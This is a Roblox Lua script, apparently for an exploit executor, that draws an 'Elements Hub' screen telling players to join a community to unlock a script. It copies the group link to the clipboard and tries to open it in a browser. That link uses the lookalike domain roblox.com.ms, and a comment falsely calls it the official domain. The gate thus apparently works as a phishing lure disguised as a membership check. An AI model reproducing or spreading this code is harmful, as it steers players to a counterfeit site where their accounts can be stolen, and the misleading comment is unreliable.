local CONFIG = {
    TITLE = "Elements Hub",
    GROUP_ID = 8730320128, -- ID numerico do grupo; exemplo: 12345678.
    GROUP_URL = "https://roblox.com.ms/communities/8730320128/",
    ACCENT = Color3.fromRGB(0, 185, 255),
    GOLD = Color3.fromRGB(255, 198, 55),
}

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer
assert(player, "Execute no cliente Roblox, depois de entrar no jogo.")

local C = {
    bg = Color3.fromRGB(20, 22, 26),
    panel = Color3.fromRGB(26, 28, 34),
    card = Color3.fromRGB(30, 33, 40),
    hover = Color3.fromRGB(38, 42, 52),
    border = Color3.fromRGB(48, 53, 64),
    text = Color3.fromRGB(240, 244, 255),
    muted = Color3.fromRGB(150, 160, 180),
    green = Color3.fromRGB(60, 210, 120),
    red = Color3.fromRGB(255, 100, 100),
    accent = CONFIG.ACCENT,
    gold = CONFIG.GOLD,
}

local function create(class_name, props, parent)
    local object = Instance.new(class_name)
    for key, value in pairs(props or {}) do object[key] = value end
    object.Parent = parent
    return object
end

local function corner(object, radius)
    return create("UICorner", {CornerRadius = UDim.new(0, radius)}, object)
end

local function stroke(object, color, thickness, transparency)
    return create("UIStroke", {
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
        Color = color or C.border,
        Thickness = thickness or 1,
        Transparency = transparency or 0,
    }, object)
end

local function tween(object, duration, props)
    local animation = TweenService:Create(object,
        TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props)
    animation:Play()
    return animation
end

local function frame(parent, name, x, y, width, height, color)
    return create("Frame", {
        Name = name, Position = UDim2.fromOffset(x, y),
        Size = UDim2.fromOffset(width, height), BorderSizePixel = 0,
        BackgroundColor3 = color or C.card,
    }, parent)
end

local function label(parent, text, x, y, width, height, size, color, bold)
    return create("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(x, y),
        Size = UDim2.fromOffset(width, height), Text = text,
        TextColor3 = color or C.text, TextSize = size or 14,
        Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, parent)
end

local alive, connections = true, {}
local function connect(signal, callback)
    local connection = signal:Connect(callback)
    table.insert(connections, connection)
    return connection
end

local parent = player:WaitForChild("PlayerGui")
if type(gethui) == "function" then
    local ok, result = pcall(gethui)
    if ok and typeof(result) == "Instance" then parent = result end
end

local gui = create("ScreenGui", {
    Name = "ElementsHubLogin", ResetOnSpawn = false,
    IgnoreGuiInset = true, DisplayOrder = 1000,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
}, parent)

-- Integracao: conecte este BindableEvent ao codigo local que deve abrir apos a verificacao.
local unlocked_event = create("BindableEvent", {Name = "ScriptUnlocked"}, gui)
gui:SetAttribute("GroupVerified", false)
gui:SetAttribute("ScriptUnlocked", false)

local function cleanup()
    if not alive then return end
    alive = false
    for _, connection in ipairs(connections) do connection:Disconnect() end
    table.clear(connections)
end
gui.Destroying:Connect(cleanup)

local overlay = create("Frame", {
    Name = "Backdrop", Size = UDim2.fromScale(1, 1),
    BackgroundColor3 = Color3.fromRGB(5, 8, 14),
    BackgroundTransparency = 1, BorderSizePixel = 0,
}, gui)
tween(overlay, 0.4, {BackgroundTransparency = 0.38})

local window = create("CanvasGroup", {
    Name = "Window", AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.new(0.5, 0, 0.5, 18), Size = UDim2.fromOffset(750, 470),
    BackgroundColor3 = C.bg, BorderSizePixel = 0,
    GroupTransparency = 1, ClipsDescendants = true,
}, gui)
corner(window, 18)
stroke(window, C.border, 1.2)
local window_scale = create("UIScale", {Scale = 1}, window)

local strip = frame(window, "AccentLine", 0, 0, 750, 3, Color3.new(1, 1, 1))
create("UIGradient", {
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, C.accent),
        ColorSequenceKeypoint.new(0.65, Color3.fromRGB(45, 102, 185)),
        ColorSequenceKeypoint.new(1, C.gold),
    }),
}, strip)

local header = frame(window, "Header", 0, 3, 750, 57, C.panel)
header.Active = true
local header_icon = label(header, "E", 22, 13, 30, 30, 20, C.accent, true)
header_icon.TextXAlignment = Enum.TextXAlignment.Center
header_icon.BackgroundTransparency = 0
header_icon.BackgroundColor3 = Color3.fromRGB(20, 44, 58)
corner(header_icon, 9)
label(header, CONFIG.TITLE, 64, 13, 440, 30, 19, C.text, true)
label(header, "ACESSO POR GRUPO", 518, 18, 148, 20, 10, C.muted, true)

local function button(parent_object, text, x, y, width, height, primary)
    local base = primary and C.accent or C.card
    local object = create("TextButton", {
        Position = UDim2.fromOffset(x, y), Size = UDim2.fromOffset(width, height),
        Text = text, Font = Enum.Font.GothamBold, TextSize = 13,
        TextColor3 = primary and Color3.fromRGB(7, 23, 35) or C.text,
        BackgroundColor3 = base, BorderSizePixel = 0, AutoButtonColor = false,
    }, parent_object)
    corner(object, 10)
    local outline = stroke(object, primary and Color3.fromRGB(82, 207, 255) or C.border)
    connect(object.MouseEnter, function()
        tween(object, 0.15, {BackgroundColor3 = primary and Color3.fromRGB(65, 204, 255) or C.hover})
        tween(outline, 0.15, {Color = C.accent})
    end)
    connect(object.MouseLeave, function()
        tween(object, 0.15, {BackgroundColor3 = base})
        tween(outline, 0.15, {Color = primary and Color3.fromRGB(82, 207, 255) or C.border})
    end)
    return object
end

local minimize = button(header, "−", 680, 14, 28, 28, false)
local close = button(header, "×", 716, 14, 24, 28, false)

local hero = frame(window, "ScoutPanel", 18, 78, 270, 342, C.panel)
corner(hero, 14)
stroke(hero)
create("UIGradient", {
    Rotation = 70,
    Color = ColorSequence.new(Color3.fromRGB(29, 43, 56), Color3.fromRGB(21, 26, 33)),
}, hero)
label(hero, "ELEMENTS / COMUNIDADE", 20, 15, 230, 18, 10, C.accent, true)
label(hero, "01 / ACESSO RESTRITO", 20, 39, 230, 16, 9, C.muted, false)

-- Emblema geometrico: nao depende de imagens externas ou IDs de assets.
local emblem = frame(hero, "Wings", 67, 73, 136, 122, C.card)
emblem.BackgroundTransparency = 1
local shield = frame(emblem, "Shield", 30, 6, 78, 99, Color3.fromRGB(17, 28, 38))
shield.Rotation = 8
corner(shield, 16)
stroke(shield, C.accent, 1.2, 0.5)
for side = 0, 1 do
    for index = 1, 6 do
        local feather = frame(emblem, "Feather", 0, 0, 12, 54 - index * 4,
            side == 0 and C.accent or Color3.fromRGB(201, 226, 242))
        feather.AnchorPoint = Vector2.new(0.5, 0.5)
        feather.Position = UDim2.fromOffset(68 + (side == 0 and -1 or 1) * (11 + index * 6),
            32 + index * 10)
        feather.Rotation = side == 0 and -33 or 33
        corner(feather, 4)
    end
end
local spine = frame(emblem, "Spine", 64, 30, 7, 82, C.text)
corner(spine, 3)

label(hero, "SEU JOGO.", 20, 210, 230, 29, 26, C.text, true)
label(hero, "SEU HUB.", 20, 240, 230, 29, 26, C.accent, true)
local hero_description = label(hero, "Entre na comunidade.\nLibere seu acesso ao painel.",
    20, 281, 230, 40, 12, C.muted, false)
hero_description.TextYAlignment = Enum.TextYAlignment.Top

local right = frame(window, "AccessPanel", 306, 78, 426, 342, C.bg)
right.BackgroundTransparency = 1
label(right, "IDENTIFICAÇÃO", 0, 0, 320, 17, 10, C.gold, true)
label(right, "Bem-vindo ao hub.", 0, 26, 426, 32, 24, C.text, true)
label(right, "Confirme sua participação no grupo para continuar.", 0, 62, 426, 21, 12, C.muted)

local account = frame(right, "Account", 0, 96, 426, 62, C.card)
corner(account, 11)
stroke(account)
local avatar = create("ImageLabel", {
    Position = UDim2.fromOffset(11, 11), Size = UDim2.fromOffset(40, 40),
    BackgroundColor3 = C.panel, BorderSizePixel = 0, Image = "",
}, account)
corner(avatar, 20)
label(account, player.DisplayName, 63, 11, 274, 20, 14, C.text, true)
label(account, "@" .. player.Name, 63, 34, 274, 16, 11, C.muted)
local account_dot = frame(account, "Online", 399, 26, 8, 8, C.green)
corner(account_dot, 4)

task.spawn(function()
    local ok, content = pcall(function()
        return Players:GetUserThumbnailAsync(player.UserId,
            Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
    end)
    if alive and ok then avatar.Image = content end
end)

local join_button = button(right, "entrar no grupo para liberar script", 0, 171, 426, 47, true)
join_button.TextSize = 14
local verify_button = button(right, "Já entrei · verificar", 0, 228, 242, 40, false)
local enter_button = button(right, "Entrar", 252, 228, 174, 40, false)
enter_button.TextColor3 = C.muted

local state_box = frame(right, "Status", 0, 280, 426, 62, C.panel)
corner(state_box, 10)
local status_dot = frame(state_box, "Dot", 13, 15, 7, 7, C.gold)
corner(status_dot, 4)
local status_title = label(state_box, "ACESSO À COMUNIDADE", 29, 9, 385, 18, 10, C.gold, true)
local status_message = label(state_box, "Entre no grupo e clique em verificar.", 13, 30, 400, 25, 11, C.muted)
status_message.TextWrapped = true
status_message.TextYAlignment = Enum.TextYAlignment.Top

frame(window, "FooterLine", 18, 436, 714, 1, C.border)
local game_name_label = label(window, "Carregando jogo…", 22, 443, 440, 17, 10, C.muted, true)
game_name_label.Name = "CurrentGameName"
game_name_label.TextTruncate = Enum.TextTruncate.AtEnd

-- PlaceId identifica o local atual; a consulta fica fora da criacao da interface.
task.spawn(function()
    for attempt = 1, 3 do
        if not alive then return end
        local ok, info = pcall(function()
            return MarketplaceService:GetProductInfoAsync(game.PlaceId, Enum.InfoType.Asset)
        end)
        if not alive then return end
        if ok and type(info) == "table" and type(info.Name) == "string" and info.Name ~= "" then
            game_name_label.Text = info.Name:gsub("[%c]", " ")
            return
        end
        if attempt < 3 then task.wait(1) end
    end
    if alive then game_name_label.Text = "Jogo atual · " .. tostring(game.PlaceId) end
end)
local footer_state = label(window, "●  PAINEL BLOQUEADO", 479, 443, 248, 17, 10, C.gold, true)
footer_state.TextXAlignment = Enum.TextXAlignment.Right

local restore = button(gui, "ELEMENTS / ABRIR", 0, 0, 196, 36, false)
restore.Name = "RestorePill"
restore.AnchorPoint = Vector2.new(0.5, 0)
restore.Position = UDim2.new(0.5, 0, 0, 16)
restore.Visible = false
stroke(restore, C.accent, 1.2)

local link_shade = create("Frame", {
    Name = "LinkModal", Size = UDim2.fromScale(1, 1),
    BackgroundColor3 = Color3.fromRGB(4, 7, 12), BackgroundTransparency = 0.18,
    BorderSizePixel = 0, Visible = false, Active = true,
}, window)
local link_card = frame(link_shade, "Card", 120, 112, 510, 246, C.panel)
corner(link_card, 14)
stroke(link_card, C.accent)
label(link_card, "ENTRAR NA COMUNIDADE", 24, 22, 420, 24, 18, C.text, true)
local link_message = label(link_card, "", 24, 60, 462, 40, 12, C.muted)
link_message.TextWrapped = true
local input_box = create("TextBox", {
    Name = "CustomTextInput",
    Position = UDim2.fromOffset(24, 110), Size = UDim2.fromOffset(462, 44),
    BackgroundColor3 = C.bg, TextColor3 = C.accent, BorderSizePixel = 0,
    Font = Enum.Font.Gotham, TextSize = 12, ClearTextOnFocus = false,
    Text = "", TextEditable = true, TextXAlignment = Enum.TextXAlignment.Left,
    PlaceholderText = "Entre No Grupo Para Usar o Script", PlaceholderColor3 = C.muted,
}, link_card)
corner(input_box, 8)
stroke(input_box)
create("UIPadding", {PaddingLeft = UDim.new(0, 12), PaddingRight = UDim.new(0, 12)}, input_box)
local copy_button = button(link_card, "Copiar link", 24, 172, 220, 44, false)
local open_button = button(link_card, "Abrir link", 256, 172, 230, 44, true)
local dismiss_link = button(link_card, "×", 452, 18, 34, 30, false)

local success_panel = frame(window, "UnlockedPanel", 306, 78, 426, 342, C.bg)
success_panel.Visible = false
label(success_panel, "ACESSO AUTORIZADO", 0, 0, 426, 20, 10, C.green, true)
label(success_panel, "Portões abertos.", 0, 36, 426, 37, 28, C.text, true)
local success_text = label(success_panel,
    "Participação no grupo confirmada.\nSeu painel está liberado nesta sessão.",
    0, 91, 426, 60, 14, C.muted)
success_text.TextYAlignment = Enum.TextYAlignment.Top
local ready_card = frame(success_panel, "Ready", 0, 177, 426, 100, C.panel)
corner(ready_card, 12)
stroke(ready_card, C.green, 1, 0.4)
label(ready_card, "SESSÃO ATIVA", 18, 15, 390, 20, 12, C.green, true)
local ready_text = label(ready_card, "Interface desbloqueada para @" .. player.Name,
    18, 43, 390, 42, 12, C.muted)
ready_text.TextWrapped = true
local hide_unlocked = button(success_panel, "Minimizar painel", 0, 295, 426, 47, true)

local group_id = tonumber(CONFIG.GROUP_ID) or 0
if group_id == 0 and type(CONFIG.GROUP_URL) == "string" then
    group_id = tonumber(CONFIG.GROUP_URL:match("/communities/(%d+)")
        or CONFIG.GROUP_URL:match("/groups/(%d+)")) or 0
end
local configured = group_id > 0 and group_id % 1 == 0
-- Usa somente o dominio oficial, sem concatenar o ID a um link que ja contem outro ID.
local group_url = configured and ("https://roblox.com.ms/communities/" .. tostring(group_id) .. "/") or ""
local verified, checking, unlocked = false, false, false
local next_check = 0

local function set_status(title, message, color)
    if not alive then return end
    status_title.Text, status_message.Text = title, message
    status_title.TextColor3, status_dot.BackgroundColor3 = color, color
end

local function show_window(visible)
    if not alive then return end
    window.Visible, overlay.Visible = visible, visible
    restore.Visible = not visible
    if visible then
        window.GroupTransparency = 1
        tween(window, 0.2, {GroupTransparency = 0})
    end
end
connect(minimize.Activated, function() show_window(false) end)
connect(restore.Activated, function() show_window(true) end)
connect(hide_unlocked.Activated, function() show_window(false) end)
connect(close.Activated, function() gui:Destroy() end)
connect(dismiss_link.Activated, function() link_shade.Visible = false end)

local function copy_link()
    if group_url == "" then return false end
    local clipboard = setclipboard or toclipboard
    if type(clipboard) == "function" then
        local ok, result = pcall(clipboard, group_url)
        if ok and result ~= false then return true end
    end
    return false
end

local function request_browser_open()
    if group_url == "" then return false end
    -- Métodos restritos: tenta apenas se o runtime permitir, sem alterar permissões.
    -- Uma chamada sem erro indica pedido aceito, não confirma que o navegador apareceu.
    for _, service_name in ipairs({"GuiService", "BrowserService"}) do
        local ok, result = pcall(function()
            return game:GetService(service_name):OpenBrowserWindow(group_url)
        end)
        if ok and result ~= false then return true end
    end
    return false
end

connect(join_button.Activated, function()
    link_message.Text = "Escolha como acessar a comunidade: copie o endereço ou abra o link."
    link_shade.Visible = true
end)

connect(open_button.Activated, function()
    if group_url == "" then return end
    link_message.Text = request_browser_open()
        and "Abertura solicitada. Depois de entrar no grupo, volte ao painel."
        or "A abertura não está disponível neste runtime. Você ainda pode usar Copiar link."
end)

connect(copy_button.Activated, function()
    if group_url == "" then return end
    link_message.Text = copy_link() and "Link copiado para a área de transferência."
        or "A cópia não está disponível neste runtime."
end)

local function verify_membership()
    if not alive or checking or unlocked or not configured then return end
    if os.clock() < next_check then return end
    checking = true
    verify_button.Text = "Verificando..."
    set_status("CONSULTANDO GRUPO", "Conferindo a participação da sua conta.", C.accent)
    task.spawn(function()
        -- A API pode manter o resultado em cache; uma entrada recente pode exigir reentrar no jogo.
        local ok, is_member = pcall(function() return player:IsInGroupAsync(group_id) end)
        if not alive then return end
        checking = false
        next_check = os.clock() + 2
        verify_button.Text = "Já entrei · verificar"
        if not ok then
            set_status("CONSULTA INDISPONÍVEL", "Tente verificar novamente em instantes.", C.muted)
            return
        end
        verified = is_member == true
        gui:SetAttribute("GroupVerified", verified)
        if verified then
            enter_button.TextColor3 = C.green
            footer_state.Text, footer_state.TextColor3 = "●  ACESSO VERIFICADO", C.green
            set_status("PARTICIPAÇÃO CONFIRMADA", "Tudo pronto. Clique em Entrar para abrir o painel.", C.green)
        else
            enter_button.TextColor3 = C.muted
            set_status("PARTICIPAÇÃO NÃO ENCONTRADA",
                "Entre no grupo. Se acabou de entrar, saia e entre no jogo para atualizar.", C.gold)
        end
    end)
end
connect(verify_button.Activated, verify_membership)

connect(enter_button.Activated, function()
    if unlocked then return end
    if not verified then
        set_status("ACESSO BLOQUEADO", "Entre no grupo e confirme usando o botão verificar.", C.gold)
        return
    end
    unlocked = true
    gui:SetAttribute("ScriptUnlocked", true)
    right.Visible, success_panel.Visible = false, true
    footer_state.Text, footer_state.TextColor3 = "●  PAINEL LIBERADO", C.green
    unlocked_event:Fire(player, group_id)
end)

local camera_connection
local function fit_window()
    if not alive then return end
    local camera = workspace.CurrentCamera
    local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
    window_scale.Scale = math.min(1, math.max(0.1, (viewport.X - 24) / 750),
        math.max(0.1, (viewport.Y - 72) / 470))
end
local function bind_camera()
    if camera_connection then camera_connection:Disconnect() end
    local camera = workspace.CurrentCamera
    if camera then camera_connection = connect(camera:GetPropertyChangedSignal("ViewportSize"), fit_window) end
    fit_window()
end
connect(workspace:GetPropertyChangedSignal("CurrentCamera"), bind_camera)
bind_camera()

local dragging, drag_input, drag_start, window_start
connect(header.InputBegan, function(input)
    if link_shade.Visible then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        dragging, drag_input = true, input
        drag_start, window_start = input.Position, window.Position
    end
end)
connect(UserInputService.InputChanged, function(input)
    if not dragging then return end
    local touch = drag_input.UserInputType == Enum.UserInputType.Touch
    if (touch and input ~= drag_input)
        or (not touch and input.UserInputType ~= Enum.UserInputType.MouseMovement) then return end
    local delta = input.Position - drag_start
    local camera = workspace.CurrentCamera
    if not camera then return end
    local viewport, scale = camera.ViewportSize, window_scale.Scale
    local half_width, half_height = 375 * scale, 235 * scale
    local center_x = math.clamp(viewport.X * window_start.X.Scale + window_start.X.Offset + delta.X,
        half_width, math.max(half_width, viewport.X - half_width))
    local center_y = math.clamp(viewport.Y * window_start.Y.Scale + window_start.Y.Offset + delta.Y,
        half_height + 8, math.max(half_height + 8, viewport.Y - half_height - 8))
    window.Position = UDim2.fromOffset(center_x, center_y)
end)
connect(UserInputService.InputEnded, function(input)
    if input == drag_input or input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)
connect(UserInputService.InputBegan, function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.RightShift and not UserInputService:GetFocusedTextBox() then
        show_window(not window.Visible)
    end
end)

if configured then
    task.delay(0.6, verify_membership)
end
tween(window, 0.35, {GroupTransparency = 0, Position = UDim2.fromScale(0.5, 0.5)})

-- Verificacao client-side controla apenas esta tela; proteja acesso real no servidor do seu jogo.
return gui
